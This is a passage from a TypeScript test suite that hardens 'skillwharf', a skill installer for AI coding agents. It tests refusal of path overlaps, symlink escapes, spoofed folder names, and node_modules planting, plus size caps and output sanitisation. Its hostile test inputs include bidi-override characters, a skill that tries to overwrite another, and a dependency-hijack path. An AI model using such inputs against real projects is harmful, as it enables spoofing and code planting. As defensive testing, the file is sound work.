    expect(loadManifest(ctx)!.skills.shared.source).toBe(path.join(outside, "shared"));
    fs.rmSync(path.join(proj, ".skillwharf"), { recursive: true });
    fs.rmSync(path.join(proj, ".claude"), { recursive: true });
    expect(() => syncSkills(ctx)).toThrow(/outside the project/);
  });
});

// ================================================================== Round 6
/** Run `fn` as on a machine where symlinks are not permitted (the copy fallback). */
function withoutSymlinks<T>(fn: () => T): T {
  const spy = vi.spyOn(fs, "symlinkSync").mockImplementation(() => {
    throw Object.assign(new Error("EPERM: operation not permitted, symlink"), { code: "EPERM" });
  });
  try {
    return fn();
  } finally {
    spy.mockRestore();
  }
}

const claudeOnly = (skills: Manifest["skills"]): Manifest => ({ version: 1, agents: ["claude"], skills });

// ------------------------------------------------------------------ D2
describe("R6-D2: a path: source that is an agent target or the store is refused, never replaced or wiped", () => {
  const folder = () => path.join(proj, ".claude", "skills", "foo");
  const intact = () => {
    expect(fs.lstatSync(folder()).isDirectory()).toBe(true);
    expect(read(path.join(folder(), "SKILL.md"))).toContain("my own words");
  };

  beforeEach(() => {
    writeSkill(folder(), "foo", "my own words");
    writeManifest(claudeOnly({ foo: { source: "path:./.claude/skills/foo" } }));
  });

  it("sync refuses, names the folder and creates no store", () => {
    expect(() => syncSkills(ctx)).toThrow(/\.claude[/\\]skills[/\\]foo/);
    intact();
    expect(fs.existsSync(storePath(ctx, "foo"))).toBe(false);
  });

  it("update refuses and names the folder", () => {
    expect(() => updateSkills(ctx, ["foo"])).toThrow(/\.claude[/\\]skills[/\\]foo/);
    intact();
  });

  it("remove leaves the folder", () => {
    removeSkill(ctx, "foo");
    intact();
  });

  it("remove leaves an identical folder when the lock does not record a copy (a store an old version made)", () => {
    fs.cpSync(folder(), storePath(ctx, "foo"), { recursive: true });
    removeSkill(ctx, "foo");
    intact();
  });

  it("add refuses the folder even with --force", () => {
    expect(() => addSkill(ctx, folder(), { force: true })).toThrow(/overlap/);
    intact();
    expect(fs.existsSync(storePath(ctx, "foo"))).toBe(false);
  });

  it("add refuses a folder that contains the agent target", () => {
    expect(() => addSkill(ctx, path.join(proj, ".claude"), { all: true })).toThrow(/overlap/);
    intact();
  });

  it("doctor reports the overlap as an error", () => {
    expect(doctor(ctx).some((i) => i.level === "error" && /overlap/.test(i.message))).toBe(true);
  });
});

describe("R6-D2: a source inside the store, or a copy onto itself, never wipes the store", () => {
  it("update refuses a source inside the store and the store survives", () => {
    writeSkill(path.join(proj, "src", "bar"), "bar", "kept");
    writeManifest(claudeOnly({ bar: { source: "path:./src/bar" } }));
    syncSkills(ctx);
    writeManifest(claudeOnly({ bar: { source: "path:./.skillwharf/skills/bar" } }));
    expect(() => updateSkills(ctx, ["bar"])).toThrow(/overlap/);
    expect(read(path.join(storePath(ctx, "bar"), "SKILL.md"))).toContain("kept");
  });

  it("copyDir refuses a destination that is, contains or lies inside the source", () => {
    const a = path.join(proj, "a");
    writeSkill(path.join(a, "child"), "child", "kept");
    expect(() => copyDir(a, a)).toThrow(/overlap/);
    expect(() => copyDir(a, path.join(a, "child"))).toThrow(/overlap/);
    expect(() => copyDir(path.join(a, "child"), a)).toThrow(/overlap/);
    expect(read(path.join(a, "child", "SKILL.md"))).toContain("kept");
  });

  it("copyDir sees through a symlink to the same folder", () => {
    const a = path.join(proj, "a");
    writeSkill(a, "a", "kept");
    fs.symlinkSync(a, path.join(proj, "alias"));
    expect(() => copyDir(path.join(proj, "alias"), a)).toThrow(/overlap/);
    expect(read(path.join(a, "SKILL.md"))).toContain("kept");
  });
});

describe("R6-D2: a copy is ours only when the lock records that skillwharf made it", () => {
  const target = () => path.join(proj, ".claude", "skills", "s");

  beforeEach(() => {
    writeManifest(claudeOnly({}));
    writeSkill(path.join(proj, "src", "s"), "s", "v1");
  });

  it("add falls back to a copy, records it, doctor reports it, and remove deletes it", () => {
    withoutSymlinks(() => addSkill(ctx, path.join(proj, "src", "s")));
    expect(fs.lstatSync(target()).isSymbolicLink()).toBe(false);
    expect(loadLock(ctx).skills.s.links).toEqual({ claude: "copy" });
    expect(doctor(ctx).some((i) => /is a copy/.test(i.message))).toBe(true);
    const r = removeSkill(ctx, "s");
    expect(r.removedLinks).toEqual(["claude"]);
    expect(fs.existsSync(target())).toBe(false);
  });

  it("re-adding replaces a recorded copy with a link and clears the record", () => {
    withoutSymlinks(() => addSkill(ctx, path.join(proj, "src", "s")));
    addSkill(ctx, path.join(proj, "src", "s"));
    expect(fs.lstatSync(target()).isSymbolicLink()).toBe(true);
    expect(loadLock(ctx).skills.s.links).toBeUndefined();
  });

  it("a lock that says copy does not make a folder with extra files ours", () => {
    withoutSymlinks(() => addSkill(ctx, path.join(proj, "src", "s")));
    fs.writeFileSync(path.join(target(), "mine.txt"), "mine");
    expect(() => syncSkills(ctx)).toThrow(/not managed/);
    expect(read(path.join(target(), "mine.txt"))).toBe("mine");
  });
});

// ------------------------------------------------------------------ D3
describe("R6-D3: an agentPaths override must sit inside a known agent folder", () => {
  const m = (p: { projectPath?: string; globalPath?: string }): Manifest =>
    ({ version: 1, agents: ["claude"], skills: {}, agentPaths: { claude: p } }) as Manifest;
  const ZWNJ = String.fromCodePoint(0x200c);

  it.each([
    "node_modules",
    "scripts",
    ".husky",
    ".",
    "./",
    "src/skills",
    ".git.",
    "GIT~1",
    `.claude/a${ZWNJ}b`,
    ".claude",
    ".claude/..",
    ".claude/x.",
    ".claude/x ",
    ".claude/.git",
    ".claude/GIT~1",
    ".claude/a b",
    ".codex/skills",
    ".CLAUDE/skills",
  ])("refuses projectPath %j", (p) => {
    expect(() => validateManifest(m({ projectPath: p }), "skillwharf.json")).toThrow(/agentPaths/);
  });

  it.each([".claude/custom", ".agents/custom-skills", ".cursor/skills/team", "./.claude/custom"])("accepts projectPath %j", (p) => {
    expect(() => validateManifest(m({ projectPath: p }), "skillwharf.json")).not.toThrow();
  });

  it("applies the same rule to globalPath", () => {
    expect(() => validateManifest(m({ globalPath: "node_modules" }), "skillwharf.json")).toThrow(/agentPaths/);
    expect(() => validateManifest(m({ globalPath: ".claude/custom" }), "skillwharf.json")).not.toThrow();
  });

  it("the error names the allowed folders", () => {
    expect(() => validateManifest(m({ projectPath: "node_modules" }), "skillwharf.json")).toThrow(/\.claude.*\.agents.*\.cursor/);
  });

  it("cannot plant a skill where Node loads dependencies from", () => {
    fs.writeFileSync(
      path.join(proj, "skillwharf.json"),
      JSON.stringify({ version: 1, agents: ["cursor"], agentPaths: { cursor: { projectPath: "node_modules" } }, skills: {} }),
    );
    writeSkill(path.join(proj, "src", "bufferutil"), "bufferutil");
    fs.writeFileSync(path.join(proj, "src", "bufferutil", "package.json"), "{}");
    expect(() => addSkill(ctx, path.join(proj, "src", "bufferutil"))).toThrow(/agentPaths/);
    expect(fs.existsSync(path.join(proj, "node_modules"))).toBe(false);
    expect(fs.existsSync(path.join(proj, ".skillwharf"))).toBe(false);
  });
});

// ------------------------------------------------------------------ D5
describe("R6-D5: update checks everything before it replaces any store", () => {
  let lockText: string, storeA: string;

  beforeEach(() => {
    writeSkill(path.join(proj, "src", "a"), "a", "v1");
    writeSkill(path.join(proj, "src", "b"), "b", "v1");
    writeManifest(claudeOnly({ a: { source: "path:./src/a" }, b: { source: "path:./src/b" } }));
    syncSkills(ctx);
    writeSkill(path.join(proj, "src", "a"), "a", "v2");
    writeSkill(path.join(proj, "src", "b"), "b", "v2");
    lockText = read(path.join(proj, "skillwharf.lock.json"));
    storeA = hashDir(storePath(ctx, "a"));
  });

  const unchanged = () => {
    expect(hashDir(storePath(ctx, "a"))).toBe(storeA);
    expect(read(path.join(proj, "skillwharf.lock.json"))).toBe(lockText);
  };

  it("a failure on the second skill leaves the first store and lock entry unchanged", () => {
    fs.rmSync(path.join(proj, "src", "b"), { recursive: true });
    expect(() => updateSkills(ctx)).toThrow(/Path not found/);
    unchanged();
  });

  it("a foreign target on the second skill is found before any store is replaced", () => {
    const tb = path.join(proj, ".claude", "skills", "b");
    fs.rmSync(tb, { recursive: true, force: true });
    fs.mkdirSync(tb);
    fs.writeFileSync(path.join(tb, "mine.txt"), "mine");
    expect(() => updateSkills(ctx)).toThrow(/not managed/);
    unchanged();
    expect(read(path.join(tb, "mine.txt"))).toBe("mine");
  });

  it("an oversized second skill is found before any store is replaced", () => {
    fs.writeFileSync(path.join(proj, "src", "b", "blob.bin"), Buffer.alloc(4096));
    expect(() => updateSkills(ctx, undefined, { limits: { maxBytes: 2048 } })).toThrow(/--max-skill-size/);
    unchanged();
  });

  it("updates every skill and keeps the lock in step with the stores (control)", () => {
    const res = updateSkills(ctx);
    expect(res.map((r) => r.changed)).toEqual([true, true]);
    for (const n of ["a", "b"]) expect(loadLock(ctx).skills[n].integrity).toBe(hashDir(storePath(ctx, n)));
  });

  it("an update reaches a recorded copy too", () => {
    writeSkill(path.join(proj, "src", "c"), "c", "v1");
    withoutSymlinks(() => addSkill(ctx, path.join(proj, "src", "c")));
    writeSkill(path.join(proj, "src", "c"), "c", "v2");
    withoutSymlinks(() => updateSkills(ctx, ["c"]));
    const t = path.join(proj, ".claude", "skills", "c");
    expect(fs.lstatSync(t).isSymbolicLink()).toBe(false);
    expect(read(path.join(t, "SKILL.md"))).toContain("v2");
    expect(loadLock(ctx).skills.c.links).toEqual({ claude: "copy" });
  });
});

// ------------------------------------------------------------------ D6
describe("R6-D6: add does not silently replace a managed skill that came from another source", () => {
  beforeEach(() => {
    writeManifest(claudeOnly({}));
    writeSkill(path.join(proj, "src", "one"), "pdf", "from one");
    writeSkill(path.join(proj, "src", "two"), "pdf", "from two");
    addSkill(ctx, path.join(proj, "src", "one"));
  });

  it("refuses a different source for the same name, printing both", () => {
    expect(() => addSkill(ctx, path.join(proj, "src", "two"))).toThrow(/path:\.\/src\/one[\s\S]*path:\.\/src\/two/);
    expect(read(path.join(storePath(ctx, "pdf"), "SKILL.md"))).toContain("from one");
    expect(loadManifest(ctx)!.skills.pdf.source).toBe("path:./src/one");
  });

  it("--force replaces it", () => {
    addSkill(ctx, path.join(proj, "src", "two"), { force: true });
    expect(read(path.join(storePath(ctx, "pdf"), "SKILL.md"))).toContain("from two");
    expect(loadManifest(ctx)!.skills.pdf.source).toBe("path:./src/two");
  });

  it("re-adding the same source is allowed", () => {
    writeSkill(path.join(proj, "src", "one"), "pdf", "from one, edited");
    expect(() => addSkill(ctx, path.join(proj, "src", "one"))).not.toThrow();
    expect(read(path.join(storePath(ctx, "pdf"), "SKILL.md"))).toContain("edited");
  });

  it("add --all cannot overwrite it through a folder named like it, and writes nothing else", () => {
    writeSkill(path.join(proj, "pack", "other"), "other");
    writeSkill(path.join(proj, "pack", "sneaky"), "pdf", "evil");
    expect(() => addSkill(ctx, path.join(proj, "pack"), { all: true })).toThrow(/pdf/);
    expect(read(path.join(storePath(ctx, "pdf"), "SKILL.md"))).toContain("from one");
    expect(fs.existsSync(storePath(ctx, "other"))).toBe(false);
  });
});

// ------------------------------------------------------------------ lows
describe("R6-lows: reads are capped and project discovery stays in bounds", () => {
  it("readSkill refuses a SKILL.md over 1 MB before parsing it", () => {
    const dir = path.join(proj, "src", "big");
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, "SKILL.md"), `---\nname: big\n---\n${"x".repeat(1024 * 1024)}`);
    expect(() => readSkill(dir)).toThrow(/larger than 1 MB/);
  });

  it("add refuses such a skill and writes nothing", () => {
    writeManifest(claudeOnly({}));
    const dir = path.join(proj, "src", "big");
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, "SKILL.md"), `---\nname: big\n---\n${"x".repeat(1024 * 1024)}`);
    expect(() => addSkill(ctx, dir)).toThrow(/larger than 1 MB/);
    expect(fs.existsSync(path.join(proj, ".skillwharf"))).toBe(false);
  });

  describe("registry responses", () => {
    afterEach(() => vi.unstubAllGlobals());
    const url = "https://registry.example.invalid/index.json";

    it("refuses a body over 5 MB, with or without a content-length", async () => {
      vi.stubGlobal("fetch", async () => new Response("x".repeat(5 * 1024 * 1024 + 10)));
      await expect(loadRegistry(url)).rejects.toThrow(/larger than 5 MB/);
      vi.stubGlobal("fetch", async () => new Response("{}", { headers: { "content-length": String(6 * 1024 * 1024) } }));
      await expect(loadRegistry(url)).rejects.toThrow(/larger than 5 MB/);
    });

    it("does not follow redirects and cuts descriptions to 300 characters", async () => {
      const seen: RequestInit[] = [];
      vi.stubGlobal("fetch", async (_u: string, init: RequestInit) => {
        seen.push(init);
        return new Response(JSON.stringify({ version: 1, skills: [{ name: "pdf", description: "d".repeat(1000), source: "github:o/r/pdf" }] }));
      });
      const idx = await loadRegistry(url);
      expect(seen[0].redirect).toBe("error");
      expect(idx.skills[0].description).toHaveLength(300);
    });
  });

  describe("findProjectRoot", () => {
    const manifestJson = JSON.stringify({ version: 1, agents: ["claude"], skills: {} });

    it("never uses the home directory, or anything above it, as the project root", () => {
      fs.writeFileSync(path.join(home, "skillwharf.json"), manifestJson);
      const work = path.join(home, "work");
      fs.mkdirSync(work);
      expect(findProjectRoot(work, home)).toBeUndefined();
      expect(makeContext({ cwd: work, home }).root).toBe(work);
    });

    it("still finds a project below the home directory (control)", () => {
      const work = path.join(home, "work", "sub");
      fs.mkdirSync(work, { recursive: true });
      fs.writeFileSync(path.join(home, "work", "skillwharf.json"), manifestJson);
      expect(findProjectRoot(work, home)).toBe(path.join(home, "work"));
    });

    it.skipIf(process.platform === "win32")("does not climb into a folder the current user does not own", () => {
      fs.writeFileSync(path.join(proj, "skillwharf.json"), manifestJson);
      const sub = path.join(proj, "sub");
      fs.mkdirSync(sub);
      expect(findProjectRoot(sub, home)).toBe(proj);
      const uid = process.getuid!();
      const spy = vi.spyOn(process, "getuid").mockReturnValue(uid + 1);
      try {
        expect(findProjectRoot(sub, home)).toBeUndefined();
      } finally {
        spy.mockRestore();
      }
    });
  });

  describe("usage scoped to a project", () => {
    const line = (cwd?: string) =>
      JSON.stringify({
        timestamp: new Date().toISOString(),
        ...(cwd ? { cwd } : {}),
        message: { content: [{ type: "tool_use", name: "Skill", input: { skill: "k" } }] },
      });

    it("respects a path boundary and does not count lines without a cwd for every project", async () => {
      const logs = path.join(home, ".claude", "projects", "p");
      fs.mkdirSync(logs, { recursive: true });
      fs.writeFileSync(path.join(logs, "s.jsonl"), [line("/a/proj"), line("/a/proj/sub"), line("/a/proj2"), line()].join("\n") + "\n");
      expect((await scanClaudeUsage({ home, project: "/a/proj" })).get("k")?.count).toBe(2);
      expect((await scanClaudeUsage({ home })).get("k")?.count).toBe(4);
    });
  });

  it("add --all skips a path folder whose name has leading or trailing whitespace", () => {
    writeManifest(claudeOnly({}));
    writeSkill(path.join(proj, "multi", "ok"), "ok");
    writeSkill(path.join(proj, "multi", "spaced "), "spaced");
    const skipped: string[] = [];
    const added = addSkill(ctx, path.join(proj, "multi"), { all: true, onSkipped: (s) => skipped.push(s.dir) });
    expect(added.map((a) => a.name)).toEqual(["ok"]);
    expect(skipped).toHaveLength(1);
    expect(Object.keys(loadManifest(ctx)!.skills)).toEqual(["ok"]);
  });
});

// ------------------------------------------------------------------ D1
describe("R6-D1: CI runs on hosted runners only", () => {
  const wf = () => read(path.join(repo, ".github", "workflows", "test.yml"));

  it("has no self-hosted runner and no false claims about forks", () => {
    expect(wf()).not.toMatch(/self-hosted/);
    expect(wf()).not.toMatch(/automatic|gains nothing/);
  });

  it("keeps the matrix, the check names and least-privilege permissions", () => {
    const text = wf();
    expect(text).toMatch(/os:\s*\[ubuntu-latest, macos-latest\]/);
    expect(text).toMatch(/runs-on: \$\{\{ matrix\.os \}\}/);
    expect(text).toMatch(/node:\s*\[22, 24\]/);
    expect(text.match(/permissions:\s*\n\s+contents: read/g)?.length).toBeGreaterThanOrEqual(2); // workflow and job
  });
});

// ------------------------------------------------------------------ test adequacy
describe("R6-lock: a lock entry that does not match its manifest entry is refused before anything is fetched", () => {
  const sha = "0123456789abcdef0123456789abcdef01234567";
  const base0 = { source: "github:acme/skills/alpha", resolved: `github:acme/skills/alpha@${sha}`, integrity: "sha256-x", installedAt: "x" };

  beforeEach(() => writeManifest(claudeOnly({ alpha: { source: "github:acme/skills/alpha" } })));

  it.each([
    ["owner", { resolved: `github:other/skills/alpha@${sha}` }],
    ["repo", { resolved: `github:acme/other/alpha@${sha}` }],
    ["sub-path", { resolved: `github:acme/skills/beta@${sha}` }],
    ["source string", { source: "github:acme/skills/alpha@main" }],
  ])("a different %s", (_what, change) => {
    writeLock({ version: 1, skills: { alpha: { ...base0, ...change } } });
    const before = read(path.join(proj, "skillwharf.lock.json"));
    expect(() => syncSkills(ctx)).toThrow(/does not match the manifest source/);
    expect(fs.existsSync(storePath(ctx, "alpha"))).toBe(false);
    expect(read(path.join(proj, "skillwharf.lock.json"))).toBe(before);
  });

  it("a path entry that points at a different path", () => {
    writeSkill(path.join(proj, "src", "s"), "s");
    writeSkill(path.join(proj, "src", "other"), "s");
    writeManifest(claudeOnly({ s: { source: "path:./src/s" } }));
    writeLock({
      version: 1,
      skills: { s: { source: "path:./src/s", resolved: `path:${path.join(proj, "src", "other")}`, integrity: "sha256-x", installedAt: "x" } },
    });
    expect(() => syncSkills(ctx)).toThrow(/does not match the manifest source/);
    expect(fs.existsSync(storePath(ctx, "s"))).toBe(false);
  });
});

describe("R6-adequacy: behaviour the earlier rounds only claimed", () => {
  it("a manifest path source that is a symlink inside the project pointing outside is refused (the realpath branch)", () => {
    writeSkill(path.join(outside, "shared"), "shared");
    fs.symlinkSync(path.join(outside, "shared"), path.join(proj, "link"));
    // lexically ./link is inside the project; only the resolved path is not
    writeManifest(claudeOnly({ x: { source: "path:./link" } }));
    expect(() => syncSkills(ctx)).toThrow(/outside the project/);
    expect(fs.existsSync(storePath(ctx, "x"))).toBe(false);
  });

  it("a .git folder in a source skill is left out of the store", () => {
    writeManifest(claudeOnly({}));
    const dir = path.join(proj, "src", "g");
    writeSkill(dir, "g");
    fs.mkdirSync(path.join(dir, ".git"));
    fs.writeFileSync(path.join(dir, ".git", "HEAD"), "ref: refs/heads/main\n");
    addSkill(ctx, dir);
    expect(fs.existsSync(path.join(storePath(ctx, "g"), ".git"))).toBe(false);
    expect(fs.existsSync(path.join(storePath(ctx, "g"), "SKILL.md"))).toBe(true);
  });

  describe("--global refuses a symlinked agent folder in the home directory", () => {
    let gctx: Context;
    beforeEach(() => {
      gctx = makeContext({ global: true, home });
      fs.mkdirSync(path.join(home, ".skillwharf"), { recursive: true });
      fs.writeFileSync(path.join(home, ".skillwharf", "skillwharf.json"), JSON.stringify({ version: 1, agents: ["claude"], skills: {} }));
      writeSkill(path.join(base, "gsrc", "g"), "g");
    });

    it("~/.claude is a symlink", () => {
      fs.symlinkSync(outside, path.join(home, ".claude"));
      expect(() => addSkill(gctx, path.join(base, "gsrc", "g"))).toThrow(/symlink/);
      expect(fs.readdirSync(outside)).toEqual([]);
    });

    it("~/.claude/skills is a symlink", () => {
      fs.mkdirSync(path.join(home, ".claude"));
      fs.symlinkSync(outside, path.join(home, ".claude", "skills"));
      expect(() => addSkill(gctx, path.join(base, "gsrc", "g"))).toThrow(/symlink/);
      expect(fs.readdirSync(outside)).toEqual([]);
    });
  });

  it("the size cap applies to sync, and nothing is installed", () => {
    const dir = path.join(proj, "src", "many");
    writeSkill(dir, "many");
    for (let i = 0; i < 3; i++) fs.writeFileSync(path.join(dir, `f${i}.txt`), "x");
    writeManifest(claudeOnly({ many: { source: "path:./src/many" } }));
    expect(() => syncSkills(ctx, { limits: { maxFiles: 2 } })).toThrow(/--max-skill-files/);
    expect(fs.existsSync(storePath(ctx, "many"))).toBe(false);
    expect(fs.existsSync(path.join(proj, ".claude"))).toBe(false);
  });

  describe("non-JSON output is sanitised too", () => {
    const unsafe = new RegExp("[\\u0080-\\u009f\\u202a-\\u202e\\u2066-\\u2069]");

    it("doctor", () => {
      writeSkill(path.join(proj, "src", "s"), "s");
      writeManifest(claudeOnly({ s: { source: "path:./src/s" } }));
      syncSkills(ctx);
      const lock = loadLock(ctx);
      lock.skills.s.resolved = `path:x${RLO}y\u009b`;
      writeLock(lock);
      const r = cli(["doctor"]);
      expect(r.stdout).toContain("does not match");
      expect(r.stdout + r.stderr).not.toMatch(unsafe);
    });

    it("the usage table", () => {
      writeManifest(claudeOnly({}));
      const logs = path.join(home, ".claude", "projects", "p");
      fs.mkdirSync(logs, { recursive: true });
      const entry = {
        timestamp: new Date().toISOString(),
        cwd: fs.realpathSync(proj),
        message: { content: [{ type: "tool_use", name: "Skill", input: { skill: `ev${RLO}il\u009b` } }] },
      };
      fs.writeFileSync(path.join(logs, "s.jsonl"), JSON.stringify(entry) + "\n");
      const r = cli(["usage"]);
      expect(r.stdout).toContain("evil");
      expect(r.stdout).not.toMatch(unsafe);
    });

    it("the search table", () => {
      const reg = path.join(base, "reg");
      fs.mkdirSync(reg);
      fs.writeFileSync(
        path.join(reg, "index.json"),
        JSON.stringify({ version: 1, skills: [{ name: "pdf", description: `pdf${RLO} tools\u009b`, source: "github:o/r/pdf", tags: [`t${RLO}`] }] }),
      );
      const r = cli(["search", "pdf", "--registry", reg]);
      expect(r.stdout).toContain("pdf");
      expect(r.stdout).not.toMatch(unsafe);
    });
  });
});
